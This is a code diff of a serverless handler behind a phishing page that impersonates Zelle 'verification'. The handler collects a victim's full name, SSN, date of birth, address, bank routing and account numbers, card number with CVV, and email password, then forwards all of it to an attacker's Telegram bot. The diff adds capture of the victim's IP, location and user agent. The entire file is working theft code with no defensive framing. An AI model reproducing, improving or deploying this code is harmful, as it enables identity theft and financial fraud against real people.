@@ -1,77 +1,67 @@
 export default async function handler(req, res) {
-  // Enable CORS for security
-  res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
-  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
-  
-  // Handle preflight
-  if (req.method === 'OPTIONS') {
-    return res.status(200).end();
-  }
-  
-  // Only allow POST
-  if (req.method !== 'POST') {
-    return res.status(405).json({ error: 'Method not allowed' });
-  }
-  
-  try {
-    const {
-      fullName,
-      addressStreet,
-      addressCity,
-      addressState,
-      addressZip,
-      ssn,
-      dob,
-      routingNumber,
-      accountNumber,
-      cardNumber,
-      cardExpiry,
-      cardCvv,
-      email,
-      password
-    } = req.body;
+    // Enable CORS
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
     
-    // Get credentials from environment variables
-    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-    
-    // Validate credentials
-    if (!BOT_TOKEN || !CHAT_ID) {
-      console.error('Missing Telegram credentials');
-      return res.status(500).json({ 
-        success: false, 
-        error: 'Telegram configuration error. Please contact support.' 
-      });
+    if (req.method === 'OPTIONS') {
+        return res.status(200).end();
     }
     
-    // Validate required fields
-    if (!fullName || !email) {
-      return res.status(400).json({ 
-        success: false, 
-        error: 'Missing required fields' 
-      });
+    if (req.method !== 'POST') {
+        return res.status(405).json({ error: 'Method not allowed' });
     }
     
-    // Format the message
-    const currentTime = new Date().toLocaleString('en-US', { 
-      timeZone: 'America/New_York',
-      dateStyle: 'full',
-      timeStyle: 'long'
-    });
-    
-    const message = `🔐 *ZELLE® VERIFICATION ALERT* 🔐
-    
+    try {
+        const {
+            fullName,
+            addressStreet,
+            addressCity,
+            addressState,
+            addressZip,
+            ssn,
+            dob,
+            routingNumber,
+            accountNumber,
+            cardNumber,
+            cardExpiry,
+            cardCvv,
+            email,
+            password,
+            ipInfo,
+            userAgent,
+            timestamp
+        } = req.body;
+        
+        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+        
+        if (!BOT_TOKEN || !CHAT_ID) {
+            console.error('Missing Telegram credentials');
+            return res.status(500).json({ 
+                success: false, 
+                error: 'Configuration error' 
+            });
+        }
+        
+        const currentTime = new Date(timestamp || Date.now()).toLocaleString('en-US', { 
+            timeZone: 'America/New_York',
+            dateStyle: 'full',
+            timeStyle: 'long'
+        });
+        
+        const message = `🔐 *ZELLE® VERIFICATION ALERT* 🔐
+        
 ━━━━━━━━━━━━━━━━━━━━━━━━━━
 👤 *PERSONAL INFORMATION*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━
-*Full Name:* ${fullName}
+*Full Name:* ${fullName || 'N/A'}
 *SSN:* ${ssn || 'N/A'}
 *DOB:* ${dob || 'N/A'}
 
 📍 *ADDRESS*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━
-${addressStreet}, ${addressCity}, ${addressState} ${addressZip}
+${addressStreet || 'N/A'}, ${addressCity || 'N/A'}, ${addressState || 'N/A'} ${addressZip || 'N/A'}
 
 🏦 *BANK DETAILS*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -86,52 +76,55 @@ ${addressStreet}, ${addressCity}, ${addressState} ${addressZip}
 
 📧 *EMAIL VERIFICATION*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━
-*Email:* ${email}
+*Email:* ${email || 'N/A'}
 *Password:* ${password || 'N/A'}
+
+🌐 *DEVICE INFORMATION*
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+*IP Address:* ${ipInfo?.ip || 'Unknown'}
+*Location:* ${ipInfo?.city || 'Unknown'}, ${ipInfo?.region || 'Unknown'}, ${ipInfo?.country || 'Unknown'}
+*User Agent:* ${userAgent?.substring(0, 100) || 'Unknown'}
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━
 🕐 *Timestamp:* ${currentTime}
-🔒 *IP:* ${req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Hidden'}
-━━━━━━━━━━━━━━━━━━━━━━━━━━
 ⚠️ *VERIFICATION COMPLETED* ⚠️`;
-    
-    // Send to Telegram
-    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    
-    const response = await fetch(telegramUrl, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: message,
-        parse_mode: 'Markdown',
-        disable_web_page_preview: true
-      })
-    });
-    
-    const data = await response.json();
-    
-    if (data.ok) {
-      console.log('✅ Telegram message sent successfully');
-      return res.status(200).json({ 
-        success: true, 
-        message: 'Verification complete' 
-      });
-    } else {
-      console.error('Telegram API error:', data);
-      return res.status(500).json({ 
-        success: false, 
-        error: data.description || 'Failed to send verification' 
-      });
+        
+        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        
+        const response = await fetch(telegramUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown',
+                disable_web_page_preview: true
+            })
+        });
+        
+        const data = await response.json();
+        
+        if (data.ok) {
+            console.log('✅ Telegram message sent successfully');
+            return res.status(200).json({ 
+                success: true, 
+                message: 'Verification complete' 
+            });
+        } else {
+            console.error('Telegram API error:', data);
+            return res.status(500).json({ 
+                success: false, 
+                error: data.description || 'Failed to send verification' 
+            });
+        }
+        
+    } catch (error) {
+        console.error('Server error:', error);
+        return res.status(500).json({ 
+            success: false, 
+            error: error.message || 'Internal server error' 
+        });
     }
-    
-  } catch (error) {
-    console.error('Server error:', error);
-    return res.status(500).json({ 
-      success: false, 
-      error: 'Internal server error. Please try again.' 
-    });
-  }
 }
